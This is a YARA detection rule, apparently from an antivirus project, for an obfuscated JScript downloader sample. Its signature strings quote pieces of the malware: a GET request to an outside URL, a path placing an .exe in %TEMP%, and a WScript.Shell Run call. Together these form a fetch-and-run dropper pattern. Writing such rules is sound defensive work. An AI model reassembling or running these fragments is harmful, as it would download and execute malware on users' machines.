rule sig_20160329_00cca10a6c6519827caff39e25b9d7b1 {
  meta:
    description = "datamaliciousorder - file 20160329_00cca10a6c6519827caff39e25b9d7b1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9d13c2b7344836b3e58e0af13bdd96c6549d527ffbb229d153a88471f10863d2"

  strings:
    $s1  = "G0[v](\"GET\", \"http://www.aluguerdiadema.com/p9wsld\", false);" fullword ascii
    $s2  = "function b() {return I0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"TaoQiS6qnRXN.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[IN](L0() * 11); if (G0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var I0 = function C() {return WScript[Hp](\"WScript.Shell\");}(), Tf = 11;" fullword ascii
    $s5  = "function n(EU, l){Lg = Lg * 1; return EU - l;};" fullword ascii
    $s6  = "function Na(){return \"\" + D;};" fullword ascii
    $s7  = "function Q(e){I0[\"Run\"](e, Lg, Lg);};" fullword ascii
    $s8  = "function fc() {return ((O == true) && (O == Dj)) ? 1 : Lg;};" fullword ascii
    $s9  = "var q = new this[\"Date\"]();" fullword ascii
    $s10 = " while (Wr){" fullword ascii
    $s11 = "function zh(){return Hp;};" fullword ascii
    $s12 = "function L()" fullword ascii
    $s13 = "return n(Y, xi);" fullword ascii
    $s14 = "function L0(){return 22;};" fullword ascii
    $s15 = "function j(E) {var Ps = (1, 2, 3, 4, 5, E); return Ps;};" fullword ascii
    $s16 = "var O = false;" fullword ascii
    $s17 = "var Dj = false;" fullword ascii
    $s18 = "var Jr = false;" fullword ascii
    $s19 = "Dj = true; " fullword ascii
    $s20 = "O = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}